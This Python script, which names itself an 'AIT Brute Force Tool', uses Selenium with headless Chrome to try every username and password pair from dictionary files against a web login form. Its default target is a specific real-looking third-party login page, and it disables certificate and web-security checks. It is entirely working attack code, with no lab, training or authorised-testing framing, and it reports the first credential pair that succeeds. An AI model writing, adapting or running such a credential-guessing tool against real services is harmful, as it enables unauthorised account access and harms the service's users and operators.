import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import logging
import argparse

def load_credentials():
    """Load username prefix, username suffixes, and passwords from text files."""

    # Get the directory where the script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))  
    
    # Construct relative paths to the dictionary folder
    base_path = os.path.join(script_dir, "Dictionary", "UC-Letters")
    prefix_file = os.path.join(script_dir, "Dictionary", "prefix.txt")
    username_file = os.path.join(base_path, "username.txt")
    password_file = os.path.join(base_path, "password.txt")
    
    try:
        with open(prefix_file, "r") as pf:
            prefix = pf.read().strip()
        with open(username_file, "r") as uf:
            usernames = [prefix + line.strip() for line in uf.readlines() if line.strip()]
        with open(password_file, "r") as pf:
            passwords = [line.strip() for line in pf.readlines() if line.strip()]
        return usernames, passwords
    except Exception as e:
        logging.error(f"Error loading credentials: {e}")
        return [], []

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Parse CLI arguments
parser = argparse.ArgumentParser(description="AIT Brute Force Tool")
parser.add_argument("--login_url", type=str, default="http://urbanlink.net.ph/urban/urbanlogin.html", help="Custom login URL")
parser.add_argument("--wrong_url", type=str, default="http://urbanlink.net.ph/urban/login", help="Wrong login redirect URL")
args = parser.parse_args()

# Load credentials
usernames, passwords = load_credentials()

if not usernames or not passwords:
    logging.error("No usernames or passwords loaded. Exiting...")
    exit(1)

# Configure Chrome options
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--ignore-ssl-errors")
chrome_options.add_argument("--allow-insecure-localhost")
chrome_options.add_argument("--disable-web-security")
chrome_options.add_argument("--ignore-certificate-errors")
chrome_options.add_argument("--disable-features=NetworkService,VizDisplayCompositor")
chrome_options.add_argument("--headless")

# Start WebDriver
with webdriver.Chrome(options=chrome_options) as driver:
    wait = WebDriverWait(driver, 10)
    driver.get(args.login_url)
    
    for username in usernames:
        for password in passwords:
            try:
                if driver.current_url == args.wrong_url:
                    logging.warning("Redirected to wrong login page. Retrying...")
                    driver.get(args.login_url)
                
                user_input = wait.until(EC.presence_of_element_located((By.NAME, "username")))
                pass_input = driver.find_element(By.NAME, "password")
                
                user_input.clear()
                pass_input.clear()
                user_input.send_keys(username)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)
                
                wait.until(lambda d: d.current_url != args.login_url)
                logging.info(f"Trying: {username} / {password} -> {driver.current_url}")
                
                if "dashboard" in driver.current_url or "success_page" in driver.current_url or "status" in driver.current_url:
                    logging.info(f"✅ Success! Username: {username}, Password: {password} - Redirected to status page")
                    exit(0)
                
                success_indicator = driver.find_elements(By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'welcome')]")
                if success_indicator:
                    logging.info(f"✅ Success! Username: {username}, Password: {password}")
                    exit(0)
                
                logging.info(f"❌ Failed: {username} / {password}")
            except TimeoutException:
                logging.error(f"⏳ Timeout waiting for elements. Retrying login for {username}/{password}...")
            except NoSuchElementException:
                logging.error(f"⚠️ Login form not found. Skipping {username}/{password}...")
            except Exception as e:
                logging.error(f"🚨 Unexpected error: {e}")
    
    logging.info("❌ No valid credentials found.")
